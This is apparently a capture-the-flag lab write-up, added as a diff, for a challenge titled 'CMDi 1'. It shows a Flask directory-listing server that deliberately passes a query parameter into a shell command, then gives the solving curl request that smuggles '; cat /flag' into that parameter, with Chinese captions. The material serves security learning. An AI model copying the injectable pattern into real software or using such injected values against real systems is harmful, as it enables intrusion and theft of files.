@@ -1,0 +1,54 @@
+## CMDi 1 
+
+server code:
+```
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/resource", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("directory", "/challenge")
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/resource"><input type=text name=directory><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+答案:
+```
+curl "http://challenge.localhost:80/resource?directory=/flag;%20cat%20/flag"
+```
+
+上面的payload等價於:
+```
+GET /resource?directory=/flag; cat /flag
+```
